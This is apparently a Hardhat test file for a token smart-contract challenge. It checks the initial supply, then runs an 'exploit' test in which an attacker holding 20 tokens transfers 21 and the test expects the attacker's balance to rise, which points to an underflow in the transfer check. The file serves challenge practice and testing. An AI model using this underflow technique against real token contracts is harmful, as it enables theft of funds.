const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Token", function () {
  let Token, TokenAttack, token, tokenAttack, owner, attacker, receiver;

  beforeEach(async function () {
    Token = await ethers.getContractFactory("Token");
    TokenAttack = await ethers.getContractFactory("TokenAttack");
    [owner, attacker, receiver] = await ethers.getSigners();

    token = await Token.deploy(1000);
    await token.deployed();

    tokenAttack = await TokenAttack.deploy(token.address);
    await tokenAttack.deployed();
  });

  describe("Initial state", function () {
    it("Should set the total supply to 1000", async function () {
      expect(await token.totalSupply()).to.equal(1000);
    });

    it("Should assign the total supply to the owner", async function () {
      expect(await token.balanceOf(owner.address)).to.equal(1000);
    });
  });

  describe("TokenAttack exploit", function () {
    it("Should solves the challenge", async function () {
      // Transfer 20 tokens from owner to attacker
      await token.transfer(attacker.address, 20);

      // Check the initial balance of the attacker
      const initialAttackerBalance = await token.balanceOf(attacker.address);
      expect(initialAttackerBalance).to.equal(20);

      // Attacker tries to transfer more tokens than they have
      await token.connect(attacker).transfer(owner.address, 21);

      // Check the final balance of the attacker
      const finalAttackerBalance = await token.balanceOf(attacker.address);
      expect(finalAttackerBalance).to.be.above(20);
    });
  });
});
